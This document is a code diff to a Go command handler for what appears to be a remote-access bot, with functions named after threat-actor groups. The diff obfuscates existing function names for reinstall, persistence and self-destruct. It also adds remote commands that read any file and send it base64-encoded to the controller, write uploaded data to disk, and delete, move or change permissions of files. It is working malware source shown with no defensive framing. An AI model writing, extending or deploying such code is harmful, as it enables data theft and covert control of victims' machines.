@@ -5,7 +5,9 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 )
 
@@ -58,18 +60,18 @@ func blackEnergy(conn net.Conn, command string) error {
 		if len(fields) >= 2 {
 			url = fields[1]
 		}
-		go dragonfly(url)
+		go fVxMqKp(url)
 		conn.Write([]byte(msgPersistStart))
 	case "!reinstall":
 		if len(fields) < 2 {
 			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !reinstall <url>")))
 			return nil
 		}
-		go reinstall(fields[1])
+		go cTwHnYz(fields[1])
 		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Reinstall initiated: "+fields[1])))
 	case "!kill":
 		conn.Write([]byte(msgKillAck))
-		nukeAndExit()
+		rZbQfGv()
 	case "!info":
 		hostname, _ := os.Hostname()
 		arch := charmingKitten()
@@ -77,6 +79,79 @@ func blackEnergy(conn net.Conn, command string) error {
 		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, info)))
 	case "!socks", "!stopsocks", "!socksauth":
 		return dispatchSocks(conn, cmd, fields)
+	case "!download":
+		if len(fields) < 2 {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !download <path>")))
+			return nil
+		}
+		path := fields[1]
+		data, err := os.ReadFile(path)
+		if err != nil {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
+			return nil
+		}
+		if len(data) > 10*1024*1024 {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "file too large (>10MB)")))
+			return nil
+		}
+		b64data := base64.StdEncoding.EncodeToString(data)
+		conn.Write([]byte("__FILE_START__" + filepath.Base(path) + "\n" + b64data + "\n__FILE_END__\n"))
+		return nil
+	case "!upload":
+		if len(fields) < 3 {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !upload <path> <base64data>")))
+			return nil
+		}
+		path := fields[1]
+		decoded, err := base64.StdEncoding.DecodeString(strings.Join(fields[2:], ""))
+		if err != nil {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "base64 decode failed: "+err.Error())))
+			return nil
+		}
+		if err := os.WriteFile(path, decoded, 0644); err != nil {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
+			return nil
+		}
+		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("wrote %d bytes to %s", len(decoded), path))))
+		return nil
+	case "!rm":
+		if len(fields) < 2 {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !rm <path>")))
+			return nil
+		}
+		if err := os.Remove(fields[1]); err != nil {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
+		} else {
+			conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "removed: "+fields[1])))
+		}
+		return nil
+	case "!mv":
+		if len(fields) < 3 {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !mv <src> <dst>")))
+			return nil
+		}
+		if err := os.Rename(fields[1], fields[2]); err != nil {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
+		} else {
+			conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fields[1]+" -> "+fields[2])))
+		}
+		return nil
+	case "!chmod":
+		if len(fields) < 3 {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !chmod <octal-mode> <path>")))
+			return nil
+		}
+		mode, err := strconv.ParseUint(fields[1], 8, 32)
+		if err != nil {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "invalid mode: "+fields[1])))
+			return nil
+		}
+		if err := os.Chmod(fields[2], os.FileMode(mode)); err != nil {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
+		} else {
+			conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("chmod %s %s: ok", fields[1], fields[2]))))
+		}
+		return nil
 	default:
 		return fmt.Errorf("unknown command")
 	}
